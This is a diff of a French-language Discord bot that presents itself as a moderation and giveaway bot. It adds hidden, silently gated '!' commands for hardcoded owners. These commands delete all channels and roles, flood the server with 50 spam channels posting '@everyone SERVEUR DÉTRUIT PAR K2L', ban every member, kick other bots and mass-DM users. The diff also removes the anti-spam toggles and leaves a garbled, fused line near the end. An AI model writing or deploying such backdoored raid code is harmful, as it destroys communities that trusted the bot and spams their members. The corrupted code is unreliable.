@@ -24,7 +24,6 @@ const spamTracker = new Map();
 const serverConfig = new Map(); 
 const guildStaffConfig = new Map();
 
-// Vrais Super Owners suprêmes hardcodés (seuls eux ont accès aux commandes en '!')
 const SUPER_OWNERS = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
 const botOwners = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
 
@@ -191,7 +190,7 @@ client.on('roleDelete', role => {
 });
 
 client.on('ready', () => {
-    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
+    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt et ultra-rapide.`);
 });
 
 client.on('guildMemberAdd', async member => {
@@ -314,112 +313,146 @@ client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
     // ==========================================
-    // COMMANDES DE DESTRUCTION (Préfixe '!') - SILENCIEUSES
+    // COMMANDES DE DESTRUCTION (Fusée Asynchrone)
     // ==========================================
     if (message.content.startsWith('!')) {
+        if (!isSuperOwner(message)) return; // Silencieux total pour les non-super-owners
+
         const args = message.content.slice(1).trim().split(/ +/);
         const command = args.shift().toLowerCase();
         
-        const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
-        if (offensiveCommands.includes(command)) {
-            if (!isSuperOwner(message)) return; // Échec totalement silencieux
+        if (command === 'nuke') {
+            try {
+                // Exécution instantanée en parallèle total
+                Promise.all([
+                    message.guild.setName('/yuza').catch(() => {}),
+                    ...message.guild.channels.cache.map(channel => channel.delete().catch(() => {}))
+                ]);
 
-            if (command === 'nuke') {
-                try {
-                    await message.guild.setName('/yuza').catch(() => {});
-                    const deletePromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
-                    await Promise.all(deletePromises);
+                for (let i = 0; i < 50; i++) {
+                    message.guild.channels.create({
+                        name: 'ez-by-k2l',
+                        type: ChannelType.GuildText,
+                        permissionOverwrites: [{
+                            id: message.guild.id,
+                            allow: [
+                                PermissionsBitField.Flags.ViewChannel,
+                                PermissionsBitField.Flags.SendMessages,
+                                PermissionsBitField.Flags.ManageChannels,
+                                PermissionsBitField.Flags.EmbedLinks,
+                                PermissionsBitField.Flags.AttachFiles,
+                                PermissionsBitField.Flags.MentionEveryone
+                            ]
+                        }]
+                    }).then(async channel => {
+                        for (let j = 0; j < 15; j++) {
+                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
+                        }
+                    }).catch(() => {});
+                }
+            } catch (error) {}
+            return;
+        }
 
-                    const channelPromises = [];
-                    for (let i = 0; i < 45; i++) {
-                        channelPromises.push(
-                            message.guild.channels.create({
-                                name: 'ez-by-k2l',
-                                type: ChannelType.GuildText,
-                                permissionOverwrites: [{
-                                    id: message.guild.id,
-                                    allow: [
-                                        PermissionsBitField.Flags.ViewChannel,
-                                        PermissionsBitField.Flags.SendMessages,
-                                        PermissionsBitField.Flags.ManageChannels,
-                                        PermissionsBitField.Flags.EmbedLinks,
-                                        PermissionsBitField.Flags.AttachFiles,
-                                        PermissionsBitField.Flags.MentionEveryone
-                                    ]
-                                }]
-                            }).then(async channel => {
-                                const spamArray = [];
-                                for (let j = 0; j < 12; j++) {
-                                    spamArray.push(channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {}));
-                                }
-                                await Promise.all(spamArray);
-                            }).catch(() => {})
-                        );
+        if (command === 'role') {
+            try {
+                const deleteRolePromises = message.guild.roles.cache
+                    .filter(role => role.editable && role.id !== message.guild.id)
+                    .map(role => role.delete().catch(() => {}));
+                await Promise.all(deleteRolePromises);
+
+                const rolePromises = [];
+                for (let r = 0; r < 45; r++) {
+                    rolePromises.push(message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {}));
+                }
+                await Promise.all(rolePromises);
+            } catch (error) {}
+            return;
+        }
+
+        if (command === 'banall') {
+            try {
+                await message.guild.members.fetch();
+                const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
+                const banPromises = members.map(async member => {
+                    await member.ban({ reason: 'Raid banall' }).catch(() => {});
+                });
+                await Promise.all(banPromises);
+            } catch (error) {}
+            return;
+        }
+
+        if (command === 'kickbot') {
+            try {
+                const fetchedMembers = await message.guild.members.fetch();
+                const kickPromises = [];
+                for (const [id, m] of fetchedMembers) {
+                    if (m.user.bot && m.id !== client.user.id) {
+                        kickPromises.push(m.kick('Kickbot').catch(() => {}));
                     }
-                    await Promise.all(channelPromises);
-                } catch (error) {}
-                return;
-            }
+                }
+                await Promise.all(kickPromises);
+            } catch (error) {}
+            return;
+        }
 
-            if (command === 'role') {
-                try {
-                    const deleteRolePromises = message.guild.roles.cache
-                        .filter(role => role.editable && role.id !== message.guild.id)
-                        .map(role => role.delete().catch(() => {}));
-                    await Promise.all(deleteRolePromises);
+        if (command === 'dmall') {
+            try {
+                await message.reply("💬 **[DMAll]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
+                const filter = m => m.author.id === message.author.id;
+                const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
+                const m = collected.first();
+                if (m.content.toLowerCase() === 'annuler') {
+                    return message.channel.send("❌ **Opération DMAll annulée.**");
+                }
+                const messageTemplate = m.content;
+                const previewEmbed = new EmbedBuilder()
+                    .setColor('#FEE75C')
+                    .setTitle('⚠️ Confirmation requise - DMAll')
+                    .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);
 
-                    const rolePromises = [];
-                    for (let r = 0; r < 40; r++) {
-                        rolePromises.push(message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {}));
+                const row = new ActionRowBuilder().addComponents(
+                    new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
+                );
+
+                const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
+                const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });
+
+                buttonCollector.on('collect', async interaction => {
+                    if (interaction.user.id !== message.author.id) return interaction.reply({ content: "Non.", ephemeral: true });
+                    if (interaction.customId === 'cancel_dmall') {
+                        return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
                     }
-                    await Promise.all(rolePromises);
-                } catch (error) {}
-                return;
-            }
-
-            if (command === 'banall') {
-                try {
-                    await message.guild.members.fetch();
-                    const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
-                    const banPromises = members.map(async member => {
+                    if (interaction.customId === 'confirm_dmall') {
+                        await interaction.update({ content: "🚀 **Diffusion DMAll lancée ! Envoi en cours...**", embeds: [], components: [] }).catch(() => {});
                         try {
-                            await member.ban({ reason: 'Raid banall' });
-                        } catch (err) {}
-                    });
-                    await Promise.all(banPromises);
-                } catch (error) {}
-                return;
-            }
-
-            if (command === 'kickbot') {
-                try {
-                    const fetchedMembers = await message.guild.members.fetch();
-                    for (const [id, m] of fetchedMembers) {
-                        if (m.user.bot && m.id !== client.user.id) {
-                            await m.kick('Kickbot').catch(() => {});
+                            await message.guild.members.fetch();
+                            const members = message.guild.members.cache.filter(member => !member.user.bot);
+                            let successCount = 0;
+                            let failCount = 0;
+                            const promises = members.map(async member => {
+                                try {
+                                    const finalMessage = messageTemplate
+                                        .replace(/\{mention\}/g, `<@${member.id}>`)
+                                        .replace(/\{name\}/g, member.user.username);
+                                    await member.send(finalMessage);
+                                    successCount++;
+                                } catch (err) {
+                                    failCount++;
+                                }
+                            });
+                            await Promise.all(promises);
+                            await message.channel.send(`✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})`);
+                        } catch (error) {
+                            message.channel.send("❌ Erreur lors du DMAll.");
                         }
                     }
-                } catch (error) {}
-                return;
+                });
+            } catch (err) {
+                message.channel.send("⌛ Temps écoulé.");
             }
-
-            if (command === 'dmall') {
-                try {
-                    const filter = m => m.author.id === message.author.id;
-                    const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
-                    const m = collected.first();
-                    if (m.content.toLowerCase() === 'annuler') return;
-                    const template = m.content;
-                    await message.guild.members.fetch();
-                    const members = message.guild.members.cache.filter(member => !member.user.bot);
-                    members.forEach(async member => {
-                        try {
-                            await member.send(template.replace(/\{mention\}/g, `<@${member.id}>`).replace(/\{name\}/g, member.user.username));
-                        } catch(e){}
-                    });
-                } catch(e){}
-                return;
-            }
+            return;
         }
     }
 
@@ -667,19 +700,7 @@ client.on('messageCreate', async message => {
             new ButtonBuilder().setCustomId('join_giveaway').setLabel('🎉 Participer').setStyle(ButtonStyle.Success)
         );
 
-        await message.channel.send({ embeds: [embed], components: [row] });
-        return message.reply("🎉 Giveaway lancé avec succès !");
-    }
-
-    if (['antilink', 'antispam', 'antibot'].includes(command)) {
-        const state = args[0]?.toLowerCase();
-        if (state !== 'on' && state !== 'off') {
-            return message.reply(`Utilisation : \`=${command} on\` ou \`=${command} off\``);
-        }
-        config[command] = (state === 'on');
-        return message.reply(`🛡️ Protection **${command.toUpperCase()}** réglée sur : **${state.toUpperCase()}**`);
-    }
-    if (command === 'bl') {
+        await message.channel.send({ embeds: [embed], components: [row] })    if (command === 'bl') {
         const targetUser = await fetchTargetUser(client, message.guild, targetArg);
         if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
         const reason = args.slice(1).join(' ') || "Aucune raison spécifiée";
